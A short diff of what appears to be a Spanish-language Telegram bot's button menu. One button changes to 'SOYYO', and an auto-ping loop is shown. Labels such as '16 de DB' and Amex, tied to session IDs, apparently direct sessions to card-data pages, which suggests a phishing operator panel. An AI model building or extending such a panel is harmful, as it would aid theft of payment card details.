@@ -50,7 +50,7 @@ function getPrimaryReplyMarkup(sessionId) {
             ],
             [
                 { text: "💳 16 de DB", callback_data: `go:partcc|${sessionId}` },
-                { text: "🌐 Virtual", callback_data: `go:virtualdedbit|${sessionId}` }
+                { text: "🌐 SOYYO", callback_data: `go:soyyo|${sessionId}` }
             ],
             [
                 { text: "🦅 Amex", callback_data: `go:amexs|${sessionId}` },
@@ -668,3 +668,4 @@ setInterval(async () => {
     console.error("❌ Error en auto-ping:", error.message);
   }
 }, 180000);
+
